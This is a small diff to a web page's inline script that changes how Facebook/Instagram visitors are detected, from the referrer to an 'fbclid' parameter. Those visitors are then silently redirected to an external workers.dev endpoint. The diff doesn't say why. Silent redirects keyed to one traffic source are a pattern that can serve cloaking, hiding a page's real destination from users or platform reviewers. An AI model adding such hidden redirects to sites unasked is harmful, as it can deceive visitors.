@@ -17,11 +17,12 @@
 
     <script>
   try {
-    const ref = document.referrer;
     const urlParams = new URLSearchParams(window.location.search);
+    const hasFbclid = urlParams.has("fbclid");
     const fromWorker = urlParams.has("from");
 
-    if (ref.includes("l.instagram.com") && !fromWorker) {
+    if (hasFbclid && !fromWorker) {
+      // Detected click from Instagram/Facebook
       window.location.href = "https://workers.client57.workers.dev/api/rfig";
     }
   } catch (e) {
